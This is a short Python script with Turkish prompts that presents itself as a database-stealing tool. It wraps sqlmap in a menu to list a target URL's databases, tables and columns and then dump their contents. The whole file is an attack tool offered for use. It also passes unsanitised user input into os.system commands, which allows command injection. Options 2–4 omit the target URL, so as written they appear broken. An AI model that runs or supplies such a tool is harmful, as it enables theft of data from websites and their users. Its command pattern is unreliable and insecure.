import os
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet veri tabanı çalma")
print("""
Bu program veri tabanını çalar.
1)linki biliyorum
2)veritabanı adını biliyorum
3)veritabanı adını ve tablo adını biliyorum
4)veritabanı adını, tablo adını ve sütun adını biliyorum
""")
islemno = input("İşlem numarasını giriniz: ")
if islemno == "1":
    link = input("Linki giriniz: ")
    os.system(f"sqlmap -u {link} --dbs")
elif islemno == "2":
    dbname = input("Veritabanı adını giriniz: ")
    os.system(f"sqlmap -D {dbname} --tables")
elif islemno == "3":
    dbname = input("Veritabanı adını giriniz: ")
    tablename = input("Tablo adını giriniz: ")
    os.system(f"sqlmap -D {dbname} -T {tablename} --columns")
elif islemno == "4":
    dbname = input("Veritabanı adını giriniz: ")
    tablename = input("Tablo adını giriniz: ")
    columnname = input("Sütun adını giriniz: ")
    os.system(f"sqlmap -D {dbname} -T {tablename} -C {columnname} --dump")
else:
    print("Geçersiz işlem numarası. Lütfen 1, 2, 3 veya 4 giriniz.")
